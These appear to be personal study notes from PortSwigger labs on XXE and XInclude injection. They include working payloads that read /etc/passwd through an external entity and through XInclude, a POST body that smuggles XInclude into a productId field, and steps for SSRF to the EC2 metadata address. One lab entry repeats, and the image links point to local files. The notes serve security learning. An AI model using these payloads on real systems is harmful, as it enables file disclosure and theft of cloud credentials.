```bash
<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
     - payload for the only xml 
```


```bash
<foo xmlns:xi="http://www.w3.org/2001/XInclude">

<xi:include parse="text" href="file:///etc/passwd"/></foo>

     - payload for xinclude

```
  

  

----------------------- Labs on Portswigger ----------------------------------

  

```bash
Exploiting XXE using external entities to retrieve files

     - if POST method include xml data to send

```
  
```bash

Exploiting XXE to perform SSRF attacks

     - the lab has a simulated aws cloud and needs to access the metadata of ec2, the productId needs an id, accessing the default url which is 169.254.169.254 should have a number, so we access the url by supplying the needs said on the response "invalid productId: latest", so we type 169.254.169.254/latest and the response will continue to give information until I solved the lab
```

  
#### XInclude Attacks 

```bash
Exploiting XInclude to retrieve files

     - POST method with productId can be inserted by Xinclude to retrieve files

     data sent:  productId=<productID xmlns:xi="http://www.w3.org/2001/XInclude">

                       <xi:include parse="text" href="file:///etc/passwd"/></productID>&storeId=1

```
  

```bash
Exploiting XInclude to retrieve files

     - POST method with productId can be inserted by Xinclude to retrieve files

     data sent:  productId=<productID xmlns:xi="http://www.w3.org/2001/XInclude">

                       <xi:include parse="text" href="file:///etc/passwd"/></productID>&storeId=1

```

  
SVG stands for Scalable Vector Graphics.

SVG defines vector-based graphics in XML format.

  

![](file:///C:/Users/Asus-pc/AppData/Local/Temp/enhtmlclip/Image(49).png)

  

  

Hostname extracted:


![](file:///C:/Users/Asus-pc/AppData/Local/Temp/enhtmlclip/Image(50).png)